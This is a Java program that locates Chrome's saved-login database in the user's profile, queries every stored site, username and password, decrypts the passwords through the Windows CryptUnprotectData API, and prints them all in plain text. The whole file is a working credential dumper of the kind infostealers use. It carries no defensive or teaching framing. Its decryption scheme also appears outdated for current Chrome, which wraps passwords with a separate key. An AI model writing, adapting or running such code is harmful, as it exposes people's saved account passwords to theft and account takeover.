import com.sun.jna.Memory;
import com.sun.jna.Native;
import com.sun.jna.Pointer;
import com.sun.jna.ptr.PointerByReference;
import com.sun.jna.win32.StdCallLibrary;
import org.sqlite.SQLiteDataSource;

import java.nio.charset.StandardCharsets;
import java.sql.Connection;
import java.sql.ResultSet;
import java.sql.Statement;
import java.util.Arrays;
import java.util.List;

public class ChromeDecryptPwApplication {

    public interface Crypt32 extends StdCallLibrary {
        boolean CryptUnprotectData(DataBlob pDataIn, Pointer ppszDataDescr, DataBlob pOptionalEntropy, Pointer pvReserved, Pointer pPromptStruct, int dwFlags, DataBlob pDataOut);
    }

    public static class DataBlob extends com.sun.jna.Structure {
        public int cbData;
        public Pointer pbData;

        public DataBlob() {
        }

        public DataBlob(byte[] data) {
            pbData = new Memory(data.length);
            pbData.write(0, data, 0, data.length);
            cbData = data.length;
        }

        @Override
        protected List<String> getFieldOrder() {
            return Arrays.asList("cbData", "pbData");
        }
    }

    public static String decryptPassword(byte[] encryptedPassword) {
        Crypt32 crypt32 = Native.load("Crypt32", Crypt32.class);
        DataBlob inputBlob = new DataBlob(encryptedPassword);
        DataBlob outputBlob = new DataBlob();
        if (crypt32.CryptUnprotectData(inputBlob, null, null, null, null, 0, outputBlob)) {
            byte[] decryptedData = outputBlob.pbData.getByteArray(0, outputBlob.cbData);
            return new String(decryptedData, StandardCharsets.UTF_8);
        }
        return null;
    }

    public static void main(String[] args) {
        try {
            String dbPath = System.getenv("USERPROFILE") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data";
            SQLiteDataSource dataSource = new SQLiteDataSource();
            dataSource.setUrl("jdbc:sqlite:" + dbPath);

            try (Connection conn = dataSource.getConnection();
                 Statement stmt = conn.createStatement();
                 ResultSet rs = stmt.executeQuery("SELECT origin_url, username_value, password_value FROM logins")) {

                while (rs.next()) {
                    String url = rs.getString("origin_url");
                    String username = rs.getString("username_value");
                    byte[] encryptedPassword = rs.getBytes("password_value");
                    String decryptedPassword = decryptPassword(encryptedPassword);

                    System.out.println("URL: " + url);
                    System.out.println("Username: " + username);
                    System.out.println("Password: " + decryptedPassword);
                    System.out.println();
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
